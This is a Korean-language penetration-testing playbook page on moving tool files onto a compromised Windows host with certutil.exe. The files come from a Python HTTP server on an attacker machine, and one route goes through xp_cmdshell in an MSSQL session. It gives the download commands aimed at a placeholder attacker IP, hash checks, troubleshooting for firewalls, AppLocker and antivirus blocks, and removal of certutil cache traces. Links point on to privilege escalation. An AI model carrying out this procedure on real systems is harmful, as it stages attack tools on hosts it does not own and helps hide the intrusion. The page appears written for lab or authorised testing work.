---
tags:
  - 환경/windows
  - 서비스/http
문서역할: 수동절차
시작조건: ["Windows 명령 실행", "공격 호스트 HTTP 포트로 outbound 연결 가능"]
필요권한: ["대상 저장 경로 쓰기 권한"]
필요조건: ["certutil.exe 사용 가능", "공격 호스트의 원본 파일과 HTTP 수신 주소"]
결과: ["Windows 대상의 도구 파일"]
---

# Certutil로 Windows HTTP 파일 반입

## 한 줄 판단

Windows 대상에서 명령을 실행하고 공격 호스트의 HTTP 포트에 연결할 수 있다면, `certutil.exe`로 원본 파일을 쓰기 가능한 경로에 내려받고 크기와 SHA-256을 비교해 정상 반입을 확인한다.

## 사용할 때

- 일반 Windows 셸이나 `xp_cmdshell`에서 HTTP로 실행 파일·스크립트를 반입할 때.
- PowerShell 다운로드가 제한되지만 `certutil.exe`를 사용할 수 있을 때.
- 전송 성공과 파일 실행 성공을 분리해 확인해야 할 때.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 공격 호스트 listener | 대상이 도달할 주소·포트에서 HTTP 수신 | 서버 시작 출력과 수신 포트 | bind 주소·VPN 인터페이스·방화벽 확인 |
| 대상 네트워크 | Windows 대상에서 HTTP 포트 연결 가능 | 실제 다운로드 요청 | DNS 대신 도달 가능한 IP와 egress 포트 확인 |
| 대상 경로 | 현재 실행 계정의 쓰기 권한 | 파일 생성·삭제 확인 | 사용자 Temp 등 다른 경로 선택 |
| 원본 무결성 | 원본 크기와 SHA-256 기록 | `sha256sum` | 원본 파일을 다시 준비 |

## 실행

### Linux 공격 호스트에서 HTTP 서버 실행

```bash
cd <SERVE_DIRECTORY>
sha256sum <SOURCE_FILE>
python3 -m http.server <PORT> --bind <ATTACKER_IP>
```

### 일반 Windows 셸에서 다운로드

```cmd
certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE> <DESTINATION_FILE>
certutil.exe -hashfile <DESTINATION_FILE> SHA256
```

### impacket-mssqlclient의 xp_cmdshell에서 다운로드

```text
SQL> xp_cmdshell certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE> C:\Windows\Temp\<SOURCE_FILE>
SQL> xp_cmdshell certutil.exe -hashfile C:\Windows\Temp\<SOURCE_FILE> SHA256
```

확인할 출력:

- 공격 호스트 HTTP 로그에 `GET /<SOURCE_FILE>`이 표시된다.
- Windows에서 `CertUtil: -URLCache command completed successfully`와 대상 파일이 확인된다.
- 송신 전후 SHA-256이 일치해야 정상 반입이다.
- 연결 오류는 HTTP listener·주소·포트 단계부터, 파일 생성 오류는 대상 경로 ACL부터 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| HTTP GET, 파일 생성과 SHA-256 일치 | 파일 반입 완료 | Windows 대상의 검증된 도구 파일 | 원래 사용하려던 공격기법으로 돌아가 파일 실행 |
| HTTP GET이 없음 | 대상에서 listener까지 연결 실패 | 파일 미반입 | bind 주소·route·방화벽·egress 포트 확인 |
| 다운로드 성공 메시지는 있으나 hash 불일치 | 전송 파일 변형·잘못된 원본 | 손상된 파일 | 실행하지 말고 원본 URL과 파일을 다시 확인 |
| 파일은 정상이나 실행 거부 | 반입과 실행 정책은 별개 | 파일 반입만 완료 | arch·ACL·AppLocker·AV 차단 단계 확인 |

## 확인할 출력과 권한

- HTTP GET은 요청 도달, `command completed successfully`는 다운로드 명령 완료, SHA-256 일치는 정상 파일 반입을 각각 입증한다.
- 파일이 존재해도 실행 권한이나 권한 상승 성공은 별도 기법에서 확인한다.

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 대상 저장 파일 | 디스크에 도구·스크립트가 남음 | 파일 경로·크기·hash 확인 | 사용 완료 후 `del <DESTINATION_FILE>` |
| URL cache 항목 | certutil cache 흔적이 남을 수 있음 | `certutil.exe -urlcache` | `certutil.exe -urlcache http://<ATTACKER_IP>:<PORT>/<SOURCE_FILE> delete` |

## 관련 공격기법

- [[제한 환경 파일 반입]]
- [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]

## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[MSSQL 인증 세션 확보 후 권한과 실행 경로 선택]]
